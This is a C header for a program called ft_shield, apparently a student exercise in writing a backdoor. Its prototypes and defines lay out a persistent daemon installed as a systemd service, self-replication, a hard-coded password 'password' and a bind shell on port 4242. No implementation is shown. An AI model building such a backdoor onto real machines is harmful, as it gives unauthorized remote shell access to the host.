#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <fcntl.h>
#include <sys/sendfile.h>
#include <sys/file.h>
#include <poll.h>
#include <stdio.h>
#include <stdbool.h>
#include <sys/signalfd.h>
#include <signal.h>

#define LOCK_FILE "/var/lock/ft_shield.lock"
#define TARGET_PATH "/usr/bin/ft_shield"
#define SERVICE_PATH "/etc/systemd/system/ft_shield.service"
#define MAX_CLIENTS 3
#define PORT 4242
#define BUFFER_SIZE 1024
#define PASSWORD "password"

typedef struct s_client
{
	bool logged;
} t_client;

typedef struct s_server
{
	int server_socket;
	int connected_clients;
	t_client clients[MAX_CLIENTS];
	struct pollfd pfds[MAX_CLIENTS + 1];
} t_server;

/*
	DAEMON
*/

// void	skeleton_daemon(void);
int		check_lock_file(void);
void	remove_lock_file(int fd);
void	daemonize(void);

/*
	QUINE
*/

// void	replicate(void);

/*
	SIGNALS
*/

int		create_signal_fd(void);
void	handle_signals(struct pollfd *pfds, int *shutdown);
int		setup_signal_fd(void);

/*
	SERVER
*/

void	start_server(void);
void	remove_clients(struct pollfd *pfds);

/*
	PASSWORD
*/

char	*generate_cypher_password(void);
char	*decode_password(char *password);

/*
	BIND SHELL
*/
void	bind_shell(int client_fd);
void	server(void);